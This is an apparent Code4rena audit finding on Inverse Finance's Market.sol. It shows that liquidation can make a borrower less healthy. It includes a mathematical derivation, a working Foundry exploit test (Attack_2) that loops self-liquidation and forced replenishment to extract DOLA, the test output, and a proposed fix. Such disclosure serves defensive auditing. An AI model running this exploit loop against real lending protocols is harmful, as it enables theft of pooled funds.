## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- satisfactory
- sponsor confirmed
- selected for report
- M-10

# [Liquidation should make a borrower _healthier_](https://github.com/code-423n4/2022-10-inverse-findings/issues/395) 

# Lines of code

https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L591


# Vulnerability details

## Impact

For a lending pool, borrower's debt healthness can be decided by the health factor, i.e. the collateral value divided by debt. ($C/D$)

The less the health factor is, the borrower's collateral is more risky of being liquidated.

Liquidation is supposed to make the borrower healthier (by paying debts and claiming some collateral), or else continuous liquidations can follow up and this can lead to a so-called [liquidation crisis](https://medium.com/coinmonks/what-is-liquidation-in-defi-lending-and-borrowing-platforms-3326e0ba8d0).

In a normal lending protocol, borrower's debt is limited by collateral factor in any case.

For this protocol, users can force replenishment for the addresses in deficit and the replenishment increases the borrower's debt.

And in the current implementation the replenishment is limited so that the new debt is not over than the collateral value.

As we will see below, this limitation is not enough and if the borrower's debt is over some threshold (still less than collateral value), liquidation makes the borrower debt "unhealthier".

And repeating liquidation can lead to various problems and we will even show an example that the attacker can take the DOLA out of the market.

## Proof of Concept

### Terminology

$C_f$ - collateralFactorBps / 10000

$L_i$ - liquidationIncentiveBps / 10000

$L_{fe}$ - liquidationFeeBps / 10000

$L_{fa}$ - liquidationFactorBps / 10000

$D$ - user's debt recognized by the market

$C$ - user's collateral held by the escrow

$P$ - collateral price in DOLA, 1 collateral = $P$ DOLAs. For simplicity, assumed to be a constant.

Constraints on the parameters in the current implementation

All parameters are in range $(0,1)$ and $L_{fe}+L_i<1$.

#### Condition for liquidation

1. Debt is over the credit limit
   
   $D>C_f  C  P$

2. Liquidation amount is limited by liquidation factor times user debt.
   
   $x\le L_{fa}D$

#### Study

We will explore a condition when the liquidation will decrease the health factor after liquidation of $x$.

After liquidation, borrower's new debt is $D-x$ and the collateral value is $CP-x(1+L_i+L_{fe})$ (in DOLA) due to the incentives and fee.

Let us see when the new health factor can be less than the previous health factor.

$\frac {CP-x(1+L_i+L_{fe})}{D-x} < \frac {CP}{D}$

$CP<D(1+L_i+L_{fe})$

$D>\frac{CP}{1+L_i+L_{fe}}$

So if the borrower's debt is over some value depending on the collateral value and liquidation incentive and fee, liquidation of any amount will make the account unhealthier.

Note that the right hand of the above inequality is still less than the collateral value and it means one can intentionally increase an account debt via replenishment so that it is over the threshold.

Furthermore, we notice that it is even possible that the debt can be greater than the above threshold without any replenishment if $C_f>\frac {1}{1+L_i+L_{fe}}$. The example attacker is written assuming this case but considering the possible side effects of replenishment, we suggest limiting the liquidation function so that it can not decrease the health factor.

#### Example

For $C_f=0.85, L_{fe}=0.01, L_{fa}=0.5, L_i=0.18$, an attacker can take DOLA out of protocol as below.
We believe that these parameters are quite realistic.
For these parameters, if an attacker borrows as much as it can, then the debt becomes greater than the threshold already without any replenishment.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../DBR.sol";
import "../Market.sol";
import "./FiRMTest.sol";

contract Attack_2 is FiRMTest {
    address operator;

    function setUp() public {
        vm.label(gov, "operator");
        operator = gov;

        collateralFactorBps = 8500;
        liquidationBonusBps = 1800;
        replenishmentPriceBps = 50000;

        initialize(replenishmentPriceBps, collateralFactorBps, replenishmentIncentiveBps, liquidationBonusBps, callOnDepositCallback);

        vm.startPrank(gov);
        market.setLiquidationFeeBps(100);
        market.setLiquidationFactorBps(5000);
        vm.stopPrank();

        vm.startPrank(chair);
        fed.expansion(IMarket(address(market)), 1_000_000e18);
        vm.stopPrank();
    }


    function getMaxForceReplenishable(address user) public view returns (uint) {
        // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral
        uint256 currentDeficit = dbr.deficitOf(user);
        uint256 limitByCollateralValue = 0;
        if(market.getCollateralValue(user) > market.debts(user))
        {
            limitByCollateralValue = (market.getCollateralValue(user) - market.debts(user)) * 10000 / dbr.replenishmentPriceBps();
        }

        return currentDeficit <= limitByCollateralValue ? currentDeficit : limitByCollateralValue;
    }

    function getMaxLiquidatable(address user) public view returns (uint) {
        // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral

        uint256 limitByLiquidationFactor = market.getLiquidatableDebt(user);
        uint256 limitByLiquidationReward = market.getCollateralValue(user) * 10000 / (10000 + market.liquidationFeeBps() + market.liquidationIncentiveBps());

        return limitByLiquidationFactor >= limitByLiquidationReward ? limitByLiquidationReward : limitByLiquidationFactor;
    }

    function userTotalValue(address user) public view returns (uint256) {
        uint P = ethFeed.latestAnswer() / 1e18;
        uint256 totalValue = DOLA.balanceOf(user) / P + WETH.balanceOf(user);
        // if the collateral value is greater than the debt, the total value includes the difference because user can repay debt and claim the collateral back
        if(market.getCollateralValue(user) > market.debts(user))
            totalValue += (market.getCollateralValue(user) - market.debts(user))/P;
        return totalValue;
    }

    function testAttack_2() public {
        uint P = ethFeed.latestAnswer() / 1e18; // assume the price stays the same

        gibWeth(user, wethTestAmount); // 10^18, 1 eth for collateral
        gibDOLA(user, wethTestAmount * P); // 10^18, 1 eth in DOLA for liquidation

        // block 1
        vm.startPrank(user);
        deposit(wethTestAmount); // collateral

        uint borrowAmount = market.getCreditLimit(user); // borrow as much as it can
        market.borrow(borrowAmount);

        emit log_named_decimal_uint("Total value before exploit", userTotalValue(user), 18);
        emit log_named_uint("B", market.debts(user));
        emit log_named_uint("D", market.debts(user));
        emit log_named_uint("C", market.getCollateralValue(user));
        emit log_named_decimal_uint("H", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);

        // start liquidation
        uint cycle = 1;
        while(cycle < 100)
        {
            emit log_named_uint("Cycle", cycle);
            uint256 liquidatable = getMaxLiquidatable(user);
            if(liquidatable > 0)
            {
                emit log("Liquidation");
                emit log_named_uint("L", liquidatable);
                market.liquidate(user, liquidatable); // liquidate as much as it can
            }
            else {
                emit log("Wait a block and force replenishment");
                vm.warp(block.timestamp + 1);
                uint256 replenishable = getMaxForceReplenishable(user);
                emit log_named_uint("R", replenishable); // force replenish as much as possible, this will incur some loss but will make the address liquidatable
                market.forceReplenish(user, replenishable);
            }


            emit log_named_uint("D", market.debts(user));
            emit log_named_uint("C", market.getCollateralValue(user));
            emit log_named_decimal_uint("H", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);

            ++ cycle;

            uint256 totalValue = userTotalValue(user);
            emit log_named_decimal_uint("Total value the user owns",  totalValue, 18);
            if(totalValue > wethTestAmount * 2)
                break; // no need to continue, the attacker already took profit from the market
        }
    }
}

```

The test results are as below. We can see that the health factor is decreasing for every liquidation and this ultimately makes the debt greater than collateral value. Then the attacker's total value increases for every liquidation and finally it gets more value than the initial status.

```
> forge test -vv --match-test testAttack_2
  Total value before exploit: 2.000000000000000000
  B: 1360000000000000000000
  D: 1360000000000000000000
  C: 1600000000000000000000
  H: 1.176470588235294117
  Cycle: 1
  Wait a block and force replenishment
  R: 43125317097919
  D: 1360000215626585489595
  C: 1600000000000000000000
  H: 1.176470401707135551
  Total value the user owns: 1.999999871971714865
  Cycle: 2
  Liquidation
  L: 680000107813292744797
  D: 680000107813292744798
  C: 790799871702181636800
  H: 1.162940803414271107
  Total value the user owns: 1.995749871297881786
  Cycle: 3
  Liquidation
  L: 340000053906646372399
  D: 340000053906646372399
  C: 386199807553272457600
  H: 1.135881606828542227
  Total value the user owns: 1.993624870960965247
  Cycle: 4
  Liquidation
  L: 170000026953323186199
  D: 170000026953323186200
  C: 183899775478817868800
  H: 1.081763213657084471
  Total value the user owns: 1.992562370792506977
  Cycle: 5
  Liquidation
  L: 85000013476661593100
  D: 85000013476661593100
  C: 82749759441590576000
  H: 0.973526427314168978
  Total value the user owns: 1.993437529480197230
  Cycle: 6
  Liquidation
  L: 42500006738330796550
  D: 42500006738330796550
  C: 32174751422976931200
  H: 0.757052854628338029
  Total value the user owns: 1.998218780238259443
  Cycle: 7
  Liquidation
  L: 21250003369165398275
  D: 21250003369165398275
  C: 6887247413670110400
  H: 0.324105709256676206
  Total value the user owns: 2.000609405617290549
```

## Tools Used

Foundry

## Recommended Mitigation Steps

Make sure the liquidation does not decrease the health index in the function `liquidate`.
With this mitigation, we also suggest limiting the debt increase in the function `forceReplenish` so that the new debt after replenish will not be over the threshold.

```solidity
function liquidate(address user, uint repaidDebt) public {
    require(repaidDebt > 0, "Must repay positive debt");
    uint debt = debts[user];
    require(getCreditLimitInternal(user) < debt, "User debt is healthy");
    require(repaidDebt <= debt * liquidationFactorBps / 10000, "Exceeded liquidation factor");

    // ****************************************
    uint beforeHealthFactor = getCollateralValue(user) * 1e18 / debt; // @audit remember the health factor before liquidation
    // ****************************************

    uint price = oracle.getPrice(address(collateral), collateralFactorBps); // collateral price in dola
    uint liquidatorReward = repaidDebt * 1 ether / price; // collateral amount
    liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;
    debts[user] -= repaidDebt;
    totalDebt -= repaidDebt;

    dbr.onRepay(user, repaidDebt);
    dola.transferFrom(msg.sender, address(this), repaidDebt);
    IEscrow escrow = predictEscrow(user);
    escrow.pay(msg.sender, liquidatorReward);
    if(liquidationFeeBps > 0) {
        uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;
        if(escrow.balance() >= liquidationFee) {
            escrow.pay(gov, liquidationFee);
        }
    }

    // ****************************************
    uint afterHealthFactor = getCollateralValue(user) * 1e18 / debts[user]; // @audit health factor after liquidation
    require(afterHealthFactor >= beforeHealthFactor, "Liquidation should not decrease the health factor of the address"); // @audit new check
    // ****************************************

    emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward);
}

function forceReplenish(address user, uint amount) public {
    uint deficit = dbr.deficitOf(user);
    require(deficit > 0, "No DBR deficit");
    require(deficit >= amount, "Amount > deficit");
    uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;
    uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;
    debts[user] += replenishmentCost;
    uint collateralValue = getCollateralValueInternal(user);

    // ****************************************
    // require(collateralValue >= debts[user], "Exceeded collateral value");
    require(collateralValue >= debts[user] * (1 + liquidationIncentiveBps / 10000 + liquidationFeeBps / 10000), "Debt exceeds safe collateral limit"); // @audit more strict limit
    // ****************************************

    totalDebt += replenishmentCost;
    dbr.onForceReplenish(user, amount);
    dola.transfer(msg.sender, replenisherReward);
    emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward);
}
```